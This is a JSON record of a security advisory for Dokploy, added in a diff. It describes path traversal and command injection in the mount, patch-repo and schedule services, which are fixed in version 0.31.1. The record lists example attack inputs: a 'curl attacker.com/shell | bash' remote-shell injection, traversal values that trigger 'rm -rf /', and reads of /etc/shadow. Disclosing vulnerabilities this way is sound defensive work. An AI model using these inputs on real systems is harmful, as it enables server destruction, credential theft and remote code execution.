@@ -1,0 +1,47 @@
+{
+  "id": "GHSA-fgh8-p4fg-jc8h",
+  "aliases": [],
+  "title": "Path Traversal + OS Command Injection in mount/patch-repo/schedule services → rm -rf / + HOST RCE",
+  "summary": "## Summary\n\nThree injection points in Dokploy's file management, patch repository, and scheduler services combine path traversal (CWE-22) with OS command injection (CWE-78). Two of these (VULN-012, VULN-015) also exploit a drizzle-zod v0.5.1 vulnerability where `$defaultFn()` fields are exposed as optional in insert schemas, allowing callers to supply arbitrary values.\n\n---\n\n## VULN-012 - Path Traversal + Command Injection via mount filePath → Arbitrary File Write + HOST RCE\n\n**File**: `packages/server/src/services/mount.ts`  \n**Lines**: 315-325 (`updateFileMount`), 336-341 (`deleteFileMount`)  \n**CWE**: CWE-22 + CWE-78 | **CVSS**: 8.5 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H\n\n`mount.filePath` (`z.string().optional()`, no regex) is joined with a base path via `path.join()` and used unquoted in shell commands:\n\n```typescript\n// updateFileMount (lines 315-324)\nconst fullPath = path.join(basePath, mount.filePath);\nconst command = `echo \"${encodedContent}\" | base64 -d > ${fullPath}`;  // UNQUOTED after >\nawait execAsyncRemote(serverId, command);\n\n// deleteFileMount (lines 336-340)\nconst fullPath = path.join(basePath, mount.filePath);\nconst command = `rm -rf ${fullPath}`;  // COMPLETELY UNQUOTED\nawait execAsyncRemote(serverId, command);\n```\n\n`path.join()` resolves `..` sequences (enabling path traversal) but does NOT remove shell metacharacters.\n\n**Attack vectors:**\n- `filePath = \"../../../../etc/cron.d/evil\"` → arbitrary file write to `/etc/cron.d/evil` with attacker-controlled content (persistent RCE via cron)\n- `filePath = \"../../../../\"` → `rm -rf /` → destroys entire server filesystem\n- `filePath = \"file; curl attacker.com/shell | bash\"` → HOST RCE via `;` injection\n\n---\n\n## VULN-013 - Path Traversal + Command Injection via patch-repo filePath → Arbitrary File Read + RCE\n\n**File**: `packages/server/src/services/patch-repo.ts`  \n**Line**: 171 (`readPatchRepoFile`)  \n**CWE**: CWE-22 + CWE-78 | **CVSS**: 7.5 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H\n\n`filePath` from API request (`z.string()`, no restriction) is joined with a repo path and embedded in `cat \"${fullPath}\"` using double-quote context:\n\n```typescript\nconst repoPath = join(PATCH_REPOS_PATH, type, application.appName);\nconst fullPath = join(repoPath, filePath);\nconst command = `cat \"${fullPath}\"`;  // ← double-quote breakout + path traversal\n```\n\n- `filePath = \"../../../../etc/shadow\"` → reads `/etc/shadow` (path traversal)\n- `filePath = '\"; cat /etc/shadow; echo \"'` → shell injection → reads arbitrary file + RCE\n\n---\n\n## VULN-015 - drizzle-zod appName Leak + Path Traversal + Command Injection → rm -rf / + HOST RCE\n\n**File**: `packages/server/src/services/schedule.ts`  \n**Lines**: 100-108 (`deleteSchedule`), 152-170 (`handleScript`)  \n**Root cause**: `packages/server/src/db/schema/schedule.ts:29,81`  \n**CWE**: CWE-22 + CWE-78 | **CVSS**: 8.5 - CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H\n\ndrizzle-zod v0.5.1 generates insert schemas with rule: `optional: (column) => !column.notNull || (column.notNull && column.hasDefault)`. `appName` has both `notNull=true` and `hasDefault=true` (via `$defaultFn`), so it becomes `z.string().optional()` - callers can override the auto-generated value.\n\n```typescript\n// db/schema/schedule.ts:29\nappName: text(\"appName\").notNull().$defaultFn(() => generateAppName(\"schedule\")),\n// createInsertSchema(schedules) → appName: z.string().optional()  ← user-supplied!\n\n// services/schedule.ts:102-103 (deleteSchedule)\nconst fullPath = path.join(SCHEDULES_PATH, schedule?.appName || \"\");\nconst command = `rm -rf ${fullPath}`;  // UNQUOTED\nawait execAsync(command);\n\n// services/schedule.ts:159-164 (handleScript)\nconst script = `mkdir -p ${fullPath}\n...`;\nawait execAsyncRemote(schedule?.serverId || \"\", script);\n```\n\n**Attack vectors:**\n- `appName = \"../../../../\"` → `path.join` → `\"/\"` → `rm -rf /` → filesystem destruction\n- `appName = \"; curl attacker.com/shell | bash #\"` → HOST RCE\n- Same drizzle-zod root cause as VULN-006 (`certificatePath...",
+  "published_at": "2026-11-12T08:16:59.000Z",
+  "modified_at": "2026-11-12T08:16:59.000Z",
+  "severity": {
+    "level": "high",
+    "score": null,
+    "vector": null,
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "affected": [
+    {
+      "product": "dokploy",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "0.31.1"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-fgh8-p4fg-jc8h",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-fgh8-p4fg-jc8h",
+      "url": "https://github.com/Dokploy/dokploy/security/advisories/GHSA-fgh8-p4fg-jc8h",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:105a569026b648a235a31d98e44e370849cb45744743da0d57e589a4e00444ae",
+  "note": null
+}
